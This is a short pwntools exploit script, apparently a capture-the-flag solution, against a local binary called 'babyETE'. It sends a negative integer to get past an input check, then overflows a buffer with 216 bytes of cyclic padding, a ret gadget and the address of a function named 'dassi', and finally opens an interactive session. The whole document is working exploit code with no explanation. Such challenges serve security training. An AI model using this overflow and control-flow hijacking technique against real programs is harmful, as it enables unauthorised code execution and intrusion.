from pwn import *

elf = ELF('./babyETE', checksec = False)

ret = p64(0x000000000040101a)

p = elf.process()

p.sendlineafter("?\n", "-214749364")
p.sendlineafter(">> ", cyclic(216) + ret + p64(elf.sym['dassi']))

p.interactive()

